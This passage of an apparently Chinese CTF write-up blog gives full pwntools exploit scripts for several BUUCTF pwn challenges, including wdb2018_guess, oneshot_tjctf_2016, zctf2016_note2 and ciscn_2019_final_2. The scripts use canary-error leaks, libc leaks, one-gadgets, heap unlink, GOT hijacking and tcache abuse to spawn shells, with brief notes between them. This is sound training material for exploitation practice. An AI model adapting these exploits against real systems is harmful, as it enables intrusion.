[<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>backdoor=<span class="hljs-number">0x80485cb</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br>        sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Give your name plz: &#x27;</span>,p32(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wdb2018-guess">wdb2018_guess</h3><p><strong>stack smashing–canary报错利用</strong>,本题因为有fork，有三条命，不然正常来讲报错就结束进程了</p><p>参考师傅：[<a href="https://blog.csdn.net/mcmuyanga/article/details/114789897?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=wdb2018_guess&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-114789897.nonecase&amp;spm=1018.2226.3001.4187">BUUCTF]PWN——wdb2018_guess（stack smashing–canary报错利用）_mcmuyanga的博客-CSDN博客</a></p><p>先vim ./wdb2018_guess 输入/alarm，把它改为isnan</p><p>方便我们本地运行</p><p>fork()创建子进程</p><p>wait()会暂时停止目前进程的执行, 直到有信号来到或子进程结束.</p><p><strong>具体步骤：</strong></p><p><strong>1.第一条命，泄露puts_got</strong></p><p>gdb调试得到 我们输入与__libc_argv[0] 的偏移</p><p>__libc_argv[0] 里存的就是./GUESS，报错时</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">**<span class="hljs-emphasis">*stack smashing detected*</span>**</span>: ./GUESS terminated<br></code></pre></td></tr></table></figure><p>就会打印处程序名字，把它覆盖成got表，就能打印got表了</p><p>0xdf38-0xde10=0x128</p><p><strong>2.第二条命，泄露_environ（环境变量）,也是栈地址</strong></p><p>gdb调试算出flag与environ的偏移</p><p>用命令</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x/a <span class="hljs-variable">_environ</span><br>search <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p><p>0xd8a8-0xd740=0x168</p><p><strong>3.第三条命，泄露flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./GUESS&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26170</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>obj = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>libc_base=puts_addr-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>environ=libc_base+libc.sym[<span class="hljs-string">&#x27;__environ&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(environ))<br>ru(<span class="hljs-string">&#x27;stack smashing detected ***: &#x27;</span>)<br>stack=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack)<br><span class="hljs-comment">#---------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Please type your guessing flag\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x128</span>+p64(stack-<span class="hljs-number">0x168</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="oneshot-tjctf-2016">oneshot_tjctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./oneshot_tjctf_2016&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oneshot_tjctf_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>r.recvuntil(<span class="hljs-string">&#x27;Value: 0x0000&#x27;</span>)<br>puts_addr=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>libc_base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>og=libc_base+<span class="hljs-number">0x45216</span><br>r.sendline(<span class="hljs-built_in">str</span>(og))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="zctf2016-note2">zctf2016_note2</h3><p>参考师傅：<a href="https://blog.csdn.net/seaaseesa/article/details/105588640">(1条消息) zctf2016_note2_seaaseesa的博客-CSDN博客</a></p><p>堆溢出》unlink》泄露got》劫持got》开shell</p><p>这题漏洞在一个输入函数里，判断语句有个size-1，而且这个是无符号整数，我们申请size大小为0，0-1后，就会强转成一个极大值，造成任意大小的堆溢出</p><p>再加之本题有指针数组，采用unlink的做法，泄露atoi的got表最方便</p><p>这题ida要仔细看，输入处理有strncat，strcpy这些函数，遇到\x0截断，所以伪造chunk时要分步，先把后面的size改掉，再处理前面填充字符，用循环，能处理填充字符变为\x0是因为有   v1[size - strlen(&amp;dest) + 14] = 0   这个语句（我猜的，不然不也是接受到\x0就截断，咋处理）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./note2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28331</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;Input the note content:\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,choice,content</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>        <span class="hljs-keyword">if</span> choice==<span class="hljs-number">1</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br>        <span class="hljs-keyword">elif</span> choice==<span class="hljs-number">0</span>:<br>                sla(<span class="hljs-string">&#x27;TheNewContents:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Input the id of the note:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------------------------------</span><br>sla(<span class="hljs-string">&#x27;Input your name:\n&#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input your address:\n&#x27;</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>target=<span class="hljs-number">0x602120</span><br>fd=target-<span class="hljs-number">0x18</span><br>bk=target-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xa1</span>)+p64(fd)+p64(bk))<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0x90</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&#x27;a&#x27;</span>*i)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p8(<span class="hljs-number">0xa0</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br>atoi_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>libc_base=atoi_addr-libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-final-2">ciscn_2019_final_2</h3><p>太难啦</p><p>seccomp-tools dump ./ciscn_final_2</p><p>沙盒，好像全关了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  =<span class="hljs-string">&#x27;./ciscn_final_2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27943</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ty_pe,number</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br>    sla(<span class="hljs-string">&#x27;your inode number:&#x27;</span>,<span class="hljs-built_in">str</span>(number))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ty_pe</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ty_pe))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;what do you want to say at last? \n&#x27;</span>,content)<br><span class="hljs-comment">#-----------------------------------------------------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xABCDEFabcdef</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>   add(<span class="hljs-number">2</span>,<span class="hljs-number">0xABCDEF</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xabcdefabcdef</span>)<span class="hljs-comment">#bool</span><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;your short type inode number :&#x27;</span>)<br>heap_low_addr=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">if</span> heap_low_addr &lt; <span class="hljs-number">0</span>:<br>   heap_low_addr += <span class="hljs-number">0x10000</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;heap_low_2byte=&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_low_addr)<br>add(<span class="hljs-number">2</span>,heap_low_addr-<span class="hljs-number">0xa0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span> + <span class="hljs-number">0x20</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>   free(<span class="hljs-number">1</span>)<br>   add(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;your int type inode number :&#x27;</span>)<br>main_arena_low_4byte=<span 